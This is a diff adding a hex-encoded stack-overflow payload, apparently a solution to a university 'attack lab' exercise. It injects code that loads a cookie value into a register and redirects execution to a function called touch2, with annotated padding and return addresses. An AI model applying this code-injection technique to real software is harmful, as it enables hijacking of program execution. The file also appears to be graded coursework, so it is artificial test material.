@@ -1,0 +1,8 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 # 40 bytes of padding (last 8 bytes are injected code)
+48 c7 c7 1b 91 ef 7f    # movq $0x7fef911b, %rdi
+c3											# retq
+38 c9 65 55 00 00 00 00 # return addr (injected code)
+b8 17 40 00 00 00 00 00 # return addr (touch2)
